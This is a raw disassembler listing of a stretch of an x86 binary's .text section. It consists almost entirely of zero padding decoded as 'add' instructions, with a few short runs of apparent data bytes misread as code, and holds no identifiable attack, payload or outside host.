                           .text:004014be 00 00                            add    %al,(%eax)
                           .text:004014c0 00 00                            add    %al,(%eax)
                           .text:004014c2 00 00                            add    %al,(%eax)
                           .text:004014c4 00 00                            add    %al,(%eax)
                           .text:004014c6 00 00                            add    %al,(%eax)
                           .text:004014c8 00 00                            add    %al,(%eax)
                           .text:004014ca 00 00                            add    %al,(%eax)
                           .text:004014cc 00 00                            add    %al,(%eax)
                           .text:004014ce 00 00                            add    %al,(%eax)
                           .text:004014d0 00 00                            add    %al,(%eax)
                           .text:004014d2 00 00                            add    %al,(%eax)
                           .text:004014d4 00 00                            add    %al,(%eax)
                           .text:004014d6 00 00                            add    %al,(%eax)
                           .text:004014d8 00 00                            add    %al,(%eax)
                           .text:004014da 00 00                            add    %al,(%eax)
                           .text:004014dc 00 00                            add    %al,(%eax)
                           .text:004014de 00 00                            add    %al,(%eax)
                           .text:004014e0 00 00                            add    %al,(%eax)
                           .text:004014e2 00 00                            add    %al,(%eax)
                           .text:004014e4 00 00                            add    %al,(%eax)
                           .text:004014e6 00 00                            add    %al,(%eax)
                           .text:004014e8 00 00                            add    %al,(%eax)
                           .text:004014ea 00 00                            add    %al,(%eax)
                           .text:004014ec 00 00                            add    %al,(%eax)
                           .text:004014ee 00 00                            add    %al,(%eax)
                           .text:004014f0 00 00                            add    %al,(%eax)
                           .text:004014f2 00 00                            add    %al,(%eax)
                           .text:004014f4 00 00                            add    %al,(%eax)
                           .text:004014f6 00 00                            add    %al,(%eax)
                           .text:004014f8 00 00                            add    %al,(%eax)
                           .text:004014fa 00 00                            add    %al,(%eax)
                           .text:004014fc 00 00                            add    %al,(%eax)
                           .text:004014fe 00 00                            add    %al,(%eax)
                           .text:00401500 00 00                            add    %al,(%eax)
                           .text:00401502 00 00                            add    %al,(%eax)
                           .text:00401504 00 00                            add    %al,(%eax)
                           .text:00401506 00 00                            add    %al,(%eax)
                           .text:00401508 00 00                            add    %al,(%eax)
                           .text:0040150a 00 00                            add    %al,(%eax)
                           .text:0040150c 00 00                            add    %al,(%eax)
                           .text:0040150e 00 00                            add    %al,(%eax)
                           .text:00401510 b6 ff                            mov    $0xff,%dh
                           .text:00401512 b7 15                            mov    $0x15,%bh
                           .text:00401514 4e                               dec    %esi
                           .text:00401515 bd f0 ab a0 62                   mov    $0x62a0abf0,%ebp
                           .text:0040151a 49                               dec    %ecx
                           .text:0040151b ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401520 08 55 6d                         or     %dl,0x6d(%ebp)
                           .text:00401523 c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401529 00 00                            add    %al,(%eax)
                           .text:0040152b 00 00                            add    %al,(%eax)
                           .text:0040152d 00 00                            add    %al,(%eax)
                           .text:0040152f 00 00                            add    %al,(%eax)
                           .text:00401531 00 00                            add    %al,(%eax)
                           .text:00401533 00 00                            add    %al,(%eax)
                           .text:00401535 00 00                            add    %al,(%eax)
                           .text:00401537 00 00                            add    %al,(%eax)
                           .text:00401539 00 00                            add    %al,(%eax)
                           .text:0040153b 00 00                            add    %al,(%eax)
                           .text:0040153d 00 00                            add    %al,(%eax)
                           .text:0040153f 00 00                            add    %al,(%eax)
                           .text:00401541 00 00                            add    %al,(%eax)
                           .text:00401543 00 00                            add    %al,(%eax)
                           .text:00401545 00 00                            add    %al,(%eax)
                           .text:00401547 00 00                            add    %al,(%eax)
                           .text:00401549 00 00                            add    %al,(%eax)
                           .text:0040154b 00 00                            add    %al,(%eax)
                           .text:0040154d 00 00                            add    %al,(%eax)
                           .text:0040154f 00 00                            add    %al,(%eax)
                           .text:00401551 00 00                            add    %al,(%eax)
                           .text:00401553 00 00                            add    %al,(%eax)
                           .text:00401555 00 00                            add    %al,(%eax)
                           .text:00401557 00 00                            add    %al,(%eax)
                           .text:00401559 00 00                            add    %al,(%eax)
                           .text:0040155b 00 00                            add    %al,(%eax)
                           .text:0040155d 00 00                            add    %al,(%eax)
                           .text:0040155f 00 00                            add    %al,(%eax)
                           .text:00401561 00 00                            add    %al,(%eax)
                           .text:00401563 00 00                            add    %al,(%eax)
                           .text:00401565 00 00                            add    %al,(%eax)
                           .text:00401567 00 00                            add    %al,(%eax)
                           .text:00401569 00 00                            add    %al,(%eax)
                           .text:0040156b 00 00                            add    %al,(%eax)
                           .text:0040156d 00 00                            add    %al,(%eax)
                           .text:0040156f 00 00                            add    %al,(%eax)
                           .text:00401571 00 00                            add    %al,(%eax)
                           .text:00401573 00 00                            add    %al,(%eax)
                           .text:00401575 00 00                            add    %al,(%eax)
                           .text:00401577 00 00                            add    %al,(%eax)
                           .text:00401579 00 00                            add    %al,(%eax)
                           .text:0040157b 00 00                            add    %al,(%eax)
                           .text:0040157d 00 00                            add    %al,(%eax)
                           .text:0040157f 00 00                            add    %al,(%eax)
                           .text:00401581 00 00                            add    %al,(%eax)
                           .text:00401583 00 00                            add    %al,(%eax)
                           .text:00401585 00 00                            add    %al,(%eax)
                           .text:00401587 00 00                            add    %al,(%eax)
                           .text:00401589 00 00                            add    %al,(%eax)
                           .text:0040158b 00 00                            add    %al,(%eax)
                           .text:0040158d 00 00                            add    %al,(%eax)
                           .text:0040158f 00 00                            add    %al,(%eax)
                           .text:00401591 00 00                            add    %al,(%eax)
                           .text:00401593 00 00                            add    %al,(%eax)
                           .text:00401595 00 00                            add    %al,(%eax)
                           .text:00401597 00 00                            add    %al,(%eax)
                           .text:00401599 00 00                            add    %al,(%eax)
                           .text:0040159b 00 00                            add    %al,(%eax)
                           .text:0040159d 00 00                            add    %al,(%eax)
                           .text:0040159f 00 00                            add    %al,(%eax)
                           .text:004015a1 00 00                            add    %al,(%eax)
                           .text:004015a3 00 00                            add    %al,(%eax)
                           .text:004015a5 00 00                            add    %al,(%eax)
                           .text:004015a7 00 00                            add    %al,(%eax)
                           .text:004015a9 00 00                            add    %al,(%eax)
                           .text:004015ab 00 00                            add    %al,(%eax)
                           .text:004015ad 00 00                            add    %al,(%eax)
                           .text:004015af 00 00                            add    %al,(%eax)
                           .text:004015b1 00 00                            add    %al,(%eax)
                           .text:004015b3 00 00                            add    %al,(%eax)
                           .text:004015b5 00 00                            add    %al,(%eax)
                           .text:004015b7 00 00                            add    %al,(%eax)
                           .text:004015b9 00 00                            add    %al,(%eax)
                           .text:004015bb 00 00                            add    %al,(%eax)
                           .text:004015bd 00 00                            add    %al,(%eax)
                           .text:004015bf 00 00                            add    %al,(%eax)
                           .text:004015c1 00 00                            add    %al,(%eax)
                           .text:004015c3 00 00                            add    %al,(%eax)
                           .text:004015c5 00 00                            add    %al,(%eax)
                           .text:004015c7 00 00                            add    %al,(%eax)
                           .text:004015c9 00 00                            add    %al,(%eax)
                           .text:004015cb 00 00                            add    %al,(%eax)
                           .text:004015cd 00 00                            add    %al,(%eax)
                           .text:004015cf 00 00                            add    %al,(%eax)
                           .text:004015d1 00 00                            add    %al,(%eax)
                           .text:004015d3 00 00                            add    %al,(%eax)
                           .text:004015d5 00 00                            add    %al,(%eax)
                           .text:004015d7 00 00                            add    %al,(%eax)
                           .text:004015d9 00 00                            add    %al,(%eax)
                           .text:004015db 00 00                            add    %al,(%eax)
                           .text:004015dd 00 00                            add    %al,(%eax)
                           .text:004015df 00 00                            add    %al,(%eax)
                           .text:004015e1 00 00                            add    %al,(%eax)
                           .text:004015e3 00 00                            add    %al,(%eax)
                           .text:004015e5 00 00                            add    %al,(%eax)
                           .text:004015e7 00 00                            add    %al,(%eax)
                           .text:004015e9 00 00                            add    %al,(%eax)
                           .text:004015eb 00 00                            add    %al,(%eax)
                           .text:004015ed 00 00                            add    %al,(%eax)
                           .text:004015ef 00 00                            add    %al,(%eax)
                           .text:004015f1 00 00                            add    %al,(%eax)
                           .text:004015f3 00 00                            add    %al,(%eax)
                           .text:004015f5 00 00                            add    %al,(%eax)
                           .text:004015f7 00 00                            add    %al,(%eax)
                           .text:004015f9 00 00                            add    %al,(%eax)
                           .text:004015fb 00 00                            add    %al,(%eax)
                           .text:004015fd 00 00                            add    %al,(%eax)
                           .text:004015ff 00 00                            add    %al,(%eax)
                           .text:00401601 00 00                            add    %al,(%eax)
                           .text:00401603 00 00                            add    %al,(%eax)
                           .text:00401605 00 00                            add    %al,(%eax)
                           .text:00401607 00 00                            add    %al,(%eax)
                           .text:00401609 00 00                            add    %al,(%eax)
                           .text:0040160b 00 00                            add    %al,(%eax)
                           .text:0040160d 00 00                            add    %al,(%eax)
                           .text:0040160f 00 00                            add    %al,(%eax)
                           .text:00401611 00 00                            add    %al,(%eax)
                           .text:00401613 00 00                            add    %al,(%eax)
                           .text:00401615 00 00                            add    %al,(%eax)
                           .text:00401617 00 41 2d                         add    %al,0x2d(%ecx)
                           .text:0040161a 47                               inc    %edi
                           .text:0040161b 9e                               sahf   
                           .text:0040161c 9e                               sahf   
                           .text:0040161d e9 3f 43 f8 66                   jmp    0x67385961
                           .text:00401622 99                               cltd   
                           .text:00401623 ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401628 60                               pusha  
                           .text:00401629 58                               pop    %eax
                           .text:0040162a 70 00                            jo     0x0040162c
                           .text:0040162c 00 00                            add    %al,(%eax)
                           .text:0040162e 00 00                            add    %al,(%eax)
                           .text:00401630 00 00                            add    %al,(%eax)
                           .text:00401632 00 00                            add    %al,(%eax)
                           .text:00401634 00 00                            add    %al,(%eax)
                           .text:00401636 00 00                            add    %al,(%eax)
                           .text:00401638 00 00                            add    %al,(%eax)
                           .text:0040163a 00 00                            add    %al,(%eax)
                           .text:0040163c 00 00                            add    %al,(%eax)
                           .text:0040163e 00 00                            add    %al,(%eax)
                           .text:00401640 00 00                            add    %al,(%eax)
                           .text:00401642 00 00                            add    %al,(%eax)
                           .text:00401644 00 00                            add    %al,(%eax)
                           .text:00401646 00 00                            add    %al,(%eax)
                           .text:00401648 00 00                            add    %al,(%eax)
                           .text:0040164a 00 00                            add    %al,(%eax)
                           .text:0040164c 00 00                            add    %al,(%eax)
                           .text:0040164e 00 00                            add    %al,(%eax)
                           .text:00401650 00 00                            add    %al,(%eax)
                           .text:00401652 00 00                            add    %al,(%eax)
                           .text:00401654 00 00                            add    %al,(%eax)
                           .text:00401656 00 00                            add    %al,(%eax)
                           .text:00401658 00 00                            add    %al,(%eax)
                           .text:0040165a 00 00                            add    %al,(%eax)
                           .text:0040165c 00 00                            add    %al,(%eax)
                           .text:0040165e 00 00                            add    %al,(%eax)
                           .text:00401660 00 00                            add    %al,(%eax)
                           .text:00401662 00 00                            add    %al,(%eax)
                           .text:00401664 00 00                            add    %al,(%eax)
                           .text:00401666 00 00                            add    %al,(%eax)
                           .text:00401668 00 00                            add    %al,(%eax)
                           .text:0040166a 00 00                            add    %al,(%eax)
                           .text:0040166c 00 00                            add    %al,(%eax)
                           .text:0040166e 00 00                            add    %al,(%eax)
                           .text:00401670 00 00                            add    %al,(%eax)
                           .text:00401672 00 00                            add    %al,(%eax)
                           .text:00401674 00 00                            add    %al,(%eax)
                           .text:00401676 00 00                            add    %al,(%eax)
                           .text:00401678 00 00                            add    %al,(%eax)
                           .text:0040167a 00 00                            add    %al,(%eax)
                           .text:0040167c 00 00                            add    %al,(%eax)
                           .text:0040167e 00 00                            add    %al,(%eax)
                           .text:00401680 00 00                            add    %al,(%eax)
                           .text:00401682 00 00                            add    %al,(%eax)
                           .text:00401684 00 00                            add    %al,(%eax)
                           .text:00401686 00 00                            add    %al,(%eax)
                           .text:00401688 00 00                            add    %al,(%eax)
                           .text:0040168a 00 00                            add    %al,(%eax)
                           .text:0040168c 00 00                            add    %al,(%eax)
                           .text:0040168e 00 00                            add    %al,(%eax)
                           .text:00401690 46                               inc    %esi
                           .text:00401691 b1 34                            mov    $0x34,%cl
                           .text:00401693 ec                               in     (%dx),%al
                           .text:00401694 83 00 cf                         addl   $0xffffffcf,(%eax)
                           .text:00401697 30 b0 67 49 ba bf                xor    %dh,-0x4045b699(%eax)
                           .text:0040169d 7f 00                            jg     0x0040169f
                           .text:0040169f 00 b0 58 70 00 00                add    %dh,0x7058(%eax)
                           .text:004016a5 00 00                            add    %al,(%eax)
                           .text:004016a7 00 00                            add    %al,(%eax)
                           .text:004016a9 00 00                            add    %al,(%eax)
                           .text:004016ab 00 00                            add    %al,(%eax)
                           .text:004016ad 00 00                            add    %al,(%eax)
                           .text:004016af 00 00                            add    %al,(%eax)
                           .text:004016b1 00 00                            add    %al,(%eax)
                           .text:004016b3 00 00                            add    %al,(%eax)
                           .text:004016b5 00 00                            add    %al,(%eax)
                           .text:004016b7 00 00                            add    %al,(%eax)
                           .text:004016b9 00 00                            add    %al,(%eax)
                           .text:004016bb 00 00                            add    %al,(%eax)
                           .text:004016bd 00 00                            add    %al,(%eax)
                           .text:004016bf 00 00                            add    %al,(%eax)
                           .text:004016c1 00 00                            add    %al,(%eax)
                           .text:004016c3 00 00                            add    %al,(%eax)
                           .text:004016c5 00 00                            add    %al,(%eax)
                           .text:004016c7 00 00                            add    %al,(%eax)
                           .text:004016c9 00 00                            add    %al,(%eax)
                           .text:004016cb 00 00                            add    %al,(%eax)
                           .text:004016cd 00 00                            add    %al,(%eax)
                           .text:004016cf 00 00                            add    %al,(%eax)
                           .text:004016d1 00 00                            add    %al,(%eax)
                           .text:004016d3 00 00                            add    %al,(%eax)
                           .text:004016d5 00 00                            add    %al,(%eax)
                           .text:004016d7 00 00                            add    %al,(%eax)
                           .text:004016d9 00 00                            add    %al,(%eax)
                           .text:004016db 00 00                            add    %al,(%eax)
                           .text:004016dd 00 00                            add    %al,(%eax)
                           .text:004016df 00 00                            add    %al,(%eax)
                           .text:004016e1 00 00                            add    %al,(%eax)
                           .text:004016e3 00 00                            add    %al,(%eax)
                           .text:004016e5 00 00                            add    %al,(%eax)
                           .text:004016e7 00 00                            add    %al,(%eax)
                           .text:004016e9 00 00                            add    %al,(%eax)
                           .text:004016eb 00 00                            add    %al,(%eax)
                           .text:004016ed 00 00                            add    %al,(%eax)
                           .text:004016ef 00 00                            add    %al,(%eax)
                           .text:004016f1 00 00                            add    %al,(%eax)
                           .text:004016f3 00 00                            add    %al,(%eax)
                           .text:004016f5 00 00                            add    %al,(%eax)
                           .text:004016f7 00 00                            add    %al,(%eax)
                           .text:004016f9 00 00                            add    %al,(%eax)
                           .text:004016fb 00 00                            add    %al,(%eax)
                           .text:004016fd 00 00                            add    %al,(%eax)
                           .text:004016ff 00 00                            add    %al,(%eax)
                           .text:00401701 00 00                            add    %al,(%eax)
                           .text:00401703 00 00                            add    %al,(%eax)
                           .text:00401705 00 00                            add    %al,(%eax)
                           .text:00401707 00 00                            add    %al,(%eax)
                           .text:00401709 00 00                            add    %al,(%eax)
                           .text:0040170b 00 00                            add    %al,(%eax)
                           .text:0040170d 00 00                            add    %al,(%eax)
                           .text:0040170f 00 00                            add    %al,(%eax)
                           .text:00401711 00 00                            add    %al,(%eax)
                           .text:00401713 00 00                            add    %al,(%eax)
                           .text:00401715 00 00                            add    %al,(%eax)
                           .text:00401717 00 00                            add    %al,(%eax)
                           .text:00401719 00 00                            add    %al,(%eax)
                           .text:0040171b 00 00                            add    %al,(%eax)
                           .text:0040171d 00 00                            add    %al,(%eax)
                           .text:0040171f 00 00                            add    %al,(%eax)
                           .text:00401721 00 00                            add    %al,(%eax)
                           .text:00401723 00 00                            add    %al,(%eax)
                           .text:00401725 00 00                            add    %al,(%eax)
                           .text:00401727 00 00                            add    %al,(%eax)
                           .text:00401729 00 00                            add    %al,(%eax)
                           .text:0040172b 00 00                            add    %al,(%eax)
                           .text:0040172d 00 00                            add    %al,(%eax)
                           .text:0040172f 00 00                            add    %al,(%eax)
                           .text:00401731 00 00                            add    %al,(%eax)
                           .text:00401733 00 00                            add    %al,(%eax)
                           .text:00401735 00 00                            add    %al,(%eax)
                           .text:00401737 00 00                            add    %al,(%eax)
                           .text:00401739 00 00                            add    %al,(%eax)
                           .text:0040173b 00 00                            add    %al,(%eax)
                           .text:0040173d 00 00                            add    %al,(%eax)
                           .text:0040173f 00 00                            add    %al,(%eax)
                           .text:00401741 00 00                            add    %al,(%eax)
                           .text:00401743 00 00                            add    %al,(%eax)
                           .text:00401745 00 00                            add    %al,(%eax)
                           .text:00401747 00 00                            add    %al,(%eax)
                           .text:00401749 00 00                            add    %al,(%eax)
                           .text:0040174b 00 00                            add    %al,(%eax)
                           .text:0040174d 00 00                            add    %al,(%eax)
                           .text:0040174f 00 00                            add    %al,(%eax)
                           .text:00401751 00 00                            add    %al,(%eax)
                           .text:00401753 00 00                            add    %al,(%eax)
                           .text:00401755 00 00                            add    %al,(%eax)
                           .text:00401757 00 00                            add    %al,(%eax)
                           .text:00401759 00 00                            add    %al,(%eax)
                           .text:0040175b 00 00                            add    %al,(%eax)
                           .text:0040175d 00 00                            add    %al,(%eax)
                           .text:0040175f 00 00                            add    %al,(%eax)
                           .text:00401761 00 00                            add    %al,(%eax)
                           .text:00401763 00 00                            add    %al,(%eax)
                           .text:00401765 00 00                            add    %al,(%eax)
                           .text:00401767 00 00                            add    %al,(%eax)
                           .text:00401769 00 00                            add    %al,(%eax)
                           .text:0040176b 00 00                            add    %al,(%eax)
                           .text:0040176d 00 00                            add    %al,(%eax)
                           .text:0040176f 00 00                            add    %al,(%eax)
                           .text:00401771 00 00                            add    %al,(%eax)
                           .text:00401773 00 00                            add    %al,(%eax)
                           .text:00401775 00 00                            add    %al,(%eax)
                           .text:00401777 00 00                            add    %al,(%eax)
                           .text:00401779 00 00                            add    %al,(%eax)
                           .text:0040177b 00 00                            add    %al,(%eax)
                           .text:0040177d 00 00                            add    %al,(%eax)
                           .text:0040177f 00 50 e8                         add    %dl,-0x18(%eax)
                           .text:00401782 a8 25                            test   $0x25,%al
                           .text:00401784 8f                               (bad)  
                           .text:00401785 f3 5d                            repz pop %ebp
                           .text:00401787 53                               push   %ebx
                           .text:00401788 a0 9b 40 ba bf                   mov    0xbfba409b,%al
                           .text:0040178d 7f 00                            jg     0x0040178f
                           .text:0040178f 00 80 58 70 00 00                add    %al,0x7058(%eax)
                           .text:00401795 00 00                            add    %al,(%eax)
                           .text:00401797 00 00                            add    %al,(%eax)
                           .text:00401799 00 00                            add    %al,(%eax)
                           .text:0040179b 00 00                            add    %al,(%eax)
                           .text:0040179d 00 00                            add    %al,(%eax)
                           .text:0040179f 00 00                            add    %al,(%eax)
                           .text:004017a1 00 00                            add    %al,(%eax)
                           .text:004017a3 00 00                            add    %al,(%eax)
                           .text:004017a5 00 00                            add    %al,(%eax)
                           .text:004017a7 00 00                            add    %al,(%eax)
                           .text:004017a9 00 00                            add    %al,(%eax)
                           .text:004017ab 00 00                            add    %al,(%eax)
                           .text:004017ad 00 00                            add    %al,(%eax)
                           .text:004017af 00 00                            add    %al,(%eax)
                           .text:004017b1 00 00                            add    %al,(%eax)
                           .text:004017b3 00 00                            add    %al,(%eax)
                           .text:004017b5 00 00                            add    %al,(%eax)
                           .text:004017b7 00 00                            add    %al,(%eax)
                           .text:004017b9 00 00                            add    %al,(%eax)
                           .text:004017bb 00 00                            add    %al,(%eax)
                           .text:004017bd 00 00                            add    %al,(%eax)
                           .text:004017bf 00 00                            add    %al,(%eax)
                           .text:004017c1 00 00                            add    %al,(%eax)
                           .text:004017c3 00 00                            add    %al,(%eax)
                           .text:004017c5 00 00                            add    %al,(%eax)
                           .text:004017c7 00 d3                            add    %dl,%bl
                           .text:004017c9 88 a6 73 f8 10 10                mov    %ah,0x1010f873(%esi)
                           .text:004017cf 46                               inc    %esi
                           .text:004017d0 e0 91                            loopne 0x00401763
                           .text:004017d2 40                               inc    %eax
                           .text:004017d3 ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:004017d8 b0 58                            mov    $0x58,%al
                           .text:004017da 70 00                            jo     0x004017dc
                           .text:004017dc 00 00                            add    %al,(%eax)
                           .text:004017de 00 00                            add    %al,(%eax)
                           .text:004017e0 00 00                            add    %al,(%eax)
                           .text:004017e2 00 00                            add    %al,(%eax)
                           .text:004017e4 00 00                            add    %al,(%eax)
                           .text:004017e6 00 00                            add    %al,(%eax)
                           .text:004017e8 00 00                            add    %al,(%eax)
                           .text:004017ea 00 00                            add    %al,(%eax)
                           .text:004017ec 00 00                            add    %al,(%eax)
                           .text:004017ee 00 00                            add    %al,(%eax)
                           .text:004017f0 00 00                            add    %al,(%eax)
                           .text:004017f2 00 00                            add    %al,(%eax)
                           .text:004017f4 00 00                            add    %al,(%eax)
                           .text:004017f6 00 00                            add    %al,(%eax)
                           .text:004017f8 55                               push   %ebp
                           .text:004017f9 27                               daa    
                           .text:004017fa b1 76                            mov    $0x76,%cl
                           .text:004017fc 2a f8                            sub    %al,%bh
                           .text:004017fe 61                               popa   
                           .text:004017ff df 68 67                         fildll 0x67(%eax)
                           .text:00401802 99                               cltd   
                           .text:00401803 ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401808 08 55 6d                         or     %dl,0x6d(%ebp)
                           .text:0040180b c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401811 00 00                            add    %al,(%eax)
                           .text:00401813 00 00                            add    %al,(%eax)
                           .text:00401815 00 00                            add    %al,(%eax)
                           .text:00401817 00 00                            add    %al,(%eax)
                           .text:00401819 00 00                            add    %al,(%eax)
                           .text:0040181b 00 00                            add    %al,(%eax)
                           .text:0040181d 00 00                            add    %al,(%eax)
                           .text:0040181f 00 00                            add    %al,(%eax)
                           .text:00401821 00 00                            add    %al,(%eax)
                           .text:00401823 00 00                            add    %al,(%eax)
                           .text:00401825 00 00                            add    %al,(%eax)
                           .text:00401827 00 d7                            add    %dl,%bh
                           .text:00401829 be a7 51 6b b7                   mov    $0xb76b51a7,%esi
                           .text:0040182e 9b                               fwait
                           .text:0040182f 56                               push   %esi
                           .text:00401830 00 8c 19 b6 bf 7f 00             add    %cl,0x7fbfb6(%ecx,%ebx,1)
                           .text:00401837 00 10                            add    %dl,(%eax)
                           .text:00401839 3d 49 ba bf 7f                   cmp    $0x7fbfba49,%eax
                           .text:0040183e 00 00                            add    %al,(%eax)
                           .text:00401840 00 00                            add    %al,(%eax)
                           .text:00401842 00 00                            add    %al,(%eax)
                           .text:00401844 00 00                            add    %al,(%eax)
                           .text:00401846 00 00                            add    %al,(%eax)
                           .text:00401848 00 00                            add    %al,(%eax)
                           .text:0040184a 00 00                            add    %al,(%eax)
                           .text:0040184c 00 00                            add    %al,(%eax)
                           .text:0040184e 00 00                            add    %al,(%eax)
                           .text:00401850 00 00                            add    %al,(%eax)
                           .text:00401852 00 00                            add    %al,(%eax)
                           .text:00401854 00 00                            add    %al,(%eax)
                           .text:00401856 00 00                            add    %al,(%eax)
                           .text:00401858 00 00                            add    %al,(%eax)
                           .text:0040185a 00 00                            add    %al,(%eax)
                           .text:0040185c 00 00                            add    %al,(%eax)
                           .text:0040185e 00 00                            add    %al,(%eax)
                           .text:00401860 00 00                            add    %al,(%eax)
                           .text:00401862 00 00                            add    %al,(%eax)
                           .text:00401864 00 00                            add    %al,(%eax)
                           .text:00401866 00 00                            add    %al,(%eax)
                           .text:00401868 00 00                            add    %al,(%eax)
                           .text:0040186a 00 00                            add    %al,(%eax)
                           .text:0040186c 00 00                            add    %al,(%eax)
                           .text:0040186e 00 00                            add    %al,(%eax)
                           .text:00401870 00 00                            add    %al,(%eax)
                           .text:00401872 00 00                            add    %al,(%eax)
                           .text:00401874 00 00                            add    %al,(%eax)
                           .text:00401876 00 00                            add    %al,(%eax)
                           .text:00401878 00 00                            add    %al,(%eax)
                           .text:0040187a 00 00                            add    %al,(%eax)
                           .text:0040187c 00 00                            add    %al,(%eax)
                           .text:0040187e 00 00                            add    %al,(%eax)
                           .text:00401880 00 00                            add    %al,(%eax)
                           .text:00401882 00 00                            add    %al,(%eax)
                           .text:00401884 00 00                            add    %al,(%eax)
                           .text:00401886 00 00                            add    %al,(%eax)
                           .text:00401888 5b                               pop    %ebx
                           .text:00401889 7f ea                            jg     0x00401875
                           .text:0040188b 4c                               dec    %esp
                           .text:0040188c 6b 75 32 a2                      imul   $0xffffffa2,0x32(%ebp),%esi
                           .text:00401890 98                               cwtl   
                           .text:00401891 69 99 ba bf 7f 00 00 08 55 6d    imul   $0x6d550800,0x7fbfba(%ecx),%ebx
                           .text:0040189b c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:004018a1 00 00                            add    %al,(%eax)
                           .text:004018a3 00 00                            add    %al,(%eax)
                           .text:004018a5 00 00                            add    %al,(%eax)
                           .text:004018a7 00 00                            add    %al,(%eax)
                           .text:004018a9 00 00                            add    %al,(%eax)
                           .text:004018ab 00 00                            add    %al,(%eax)
                           .text:004018ad 00 00                            add    %al,(%eax)
                           .text:004018af 00 00                            add    %al,(%eax)
                           .text:004018b1 00 00                            add    %al,(%eax)
                           .text:004018b3 00 00                            add    %al,(%eax)
                           .text:004018b5 00 00                            add    %al,(%eax)
                           .text:004018b7 00 dd                            add    %bl,%ch
                           .text:004018b9 14 de                            adc    $0xde,%al
                           .text:004018bb 7f 8a                            jg     0x00401847
                           .text:004018bd b5 b0                            mov    $0xb0,%ch
                           .text:004018bf 69 e0 9d 40 ba bf                imul   $0xbfba409d,%eax,%esp
                           .text:004018c5 7f 00                            jg     0x004018c7
                           .text:004018c7 00 80 58 70 00 00                add    %al,0x7058(%eax)
                           .text:004018cd 00 00                            add    %al,(%eax)
                           .text:004018cf 00 00                            add    %al,(%eax)
                           .text:004018d1 00 00                            add    %al,(%eax)
                           .text:004018d3 00 00                            add    %al,(%eax)
                           .text:004018d5 00 00                            add    %al,(%eax)
                           .text:004018d7 00 00                            add    %al,(%eax)
                           .text:004018d9 00 00                            add    %al,(%eax)
                           .text:004018db 00 00                            add    %al,(%eax)
                           .text:004018dd 00 00                            add    %al,(%eax)
                           .text:004018df 00 00                            add    %al,(%eax)
                           .text:004018e1 00 00                            add    %al,(%eax)
                           .text:004018e3 00 00                            add    %al,(%eax)
                           .text:004018e5 00 00                            add    %al,(%eax)
                           .text:004018e7 00 00                            add    %al,(%eax)
                           .text:004018e9 00 00                            add    %al,(%eax)
                           .text:004018eb 00 00                            add    %al,(%eax)
                           .text:004018ed 00 00                            add    %al,(%eax)
                           .text:004018ef 00 00                            add    %al,(%eax)
                           .text:004018f1 00 00                            add    %al,(%eax)
                           .text:004018f3 00 00                            add    %al,(%eax)
                           .text:004018f5 00 00                            add    %al,(%eax)
                           .text:004018f7 00 00                            add    %al,(%eax)
                           .text:004018f9 00 00                            add    %al,(%eax)
                           .text:004018fb 00 00                            add    %al,(%eax)
                           .text:004018fd 00 00                            add    %al,(%eax)
                           .text:004018ff 00 00                            add    %al,(%eax)
                           .text:00401901 00 00                            add    %al,(%eax)
                           .text:00401903 00 00                            add    %al,(%eax)
                           .text:00401905 00 00                            add    %al,(%eax)
                           .text:00401907 00 00                            add    %al,(%eax)
                           .text:00401909 00 00                            add    %al,(%eax)
                           .text:0040190b 00 00                            add    %al,(%eax)
                           .text:0040190d 00 00                            add    %al,(%eax)
                           .text:0040190f 00 00                            add    %al,(%eax)
                           .text:00401911 00 00                            add    %al,(%eax)
                           .text:00401913 00 00                            add    %al,(%eax)
                           .text:00401915 00 00                            add    %al,(%eax)
                           .text:00401917 00 00                            add    %al,(%eax)
                           .text:00401919 00 00                            add    %al,(%eax)
                           .text:0040191b 00 00                            add    %al,(%eax)
                           .text:0040191d 00 00                            add    %al,(%eax)
                           .text:0040191f 00 00                            add    %al,(%eax)
                           .text:00401921 00 00                            add    %al,(%eax)
                           .text:00401923 00 00                            add    %al,(%eax)
                           .text:00401925 00 00                            add    %al,(%eax)
                           .text:00401927 00 00                            add    %al,(%eax)
                           .text:00401929 00 00                            add    %al,(%eax)
                           .text:0040192b 00 00                            add    %al,(%eax)
                           .text:0040192d 00 00                            add    %al,(%eax)
                           .text:0040192f 00 00                            add    %al,(%eax)
                           .text:00401931 00 00                            add    %al,(%eax)
                           .text:00401933 00 00                            add    %al,(%eax)
                           .text:00401935 00 00                            add    %al,(%eax)
                           .text:00401937 00 00                            add    %al,(%eax)
                           .text:00401939 00 00                            add    %al,(%eax)
                           .text:0040193b 00 00                            add    %al,(%eax)
                           .text:0040193d 00 00                            add    %al,(%eax)
                           .text:0040193f 00 00                            add    %al,(%eax)
                           .text:00401941 00 00                            add    %al,(%eax)
                           .text:00401943 00 00                            add    %al,(%eax)
                           .text:00401945 00 00                            add    %al,(%eax)
                           .text:00401947 00 00                            add    %al,(%eax)
                           .text:00401949 00 00                            add    %al,(%eax)
                           .text:0040194b 00 00                            add    %al,(%eax)
                           .text:0040194d 00 00                            add    %al,(%eax)
                           .text:0040194f 00 00                            add    %al,(%eax)
                           .text:00401951 00 00                            add    %al,(%eax)
                           .text:00401953 00 00                            add    %al,(%eax)
                           .text:00401955 00 00                            add    %al,(%eax)
                           .text:00401957 00 00                            add    %al,(%eax)
                           .text:00401959 00 00                            add    %al,(%eax)
                           .text:0040195b 00 00                            add    %al,(%eax)
                           .text:0040195d 00 00                            add    %al,(%eax)
                           .text:0040195f 00 00                            add    %al,(%eax)
                           .text:00401961 00 00                            add    %al,(%eax)
                           .text:00401963 00 00                            add    %al,(%eax)
                           .text:00401965 00 00                            add    %al,(%eax)
                           .text:00401967 00 00                            add    %al,(%eax)
                           .text:00401969 00 00                            add    %al,(%eax)
                           .text:0040196b 00 00                            add    %al,(%eax)
                           .text:0040196d 00 00                            add    %al,(%eax)
                           .text:0040196f 00 00                            add    %al,(%eax)
                           .text:00401971 00 00                            add    %al,(%eax)
                           .text:00401973 00 00                            add    %al,(%eax)
                           .text:00401975 00 00                            add    %al,(%eax)
                           .text:00401977 00 00                            add    %al,(%eax)
                           .text:00401979 00 00                            add    %al,(%eax)
                           .text:0040197b 00 00                            add    %al,(%eax)
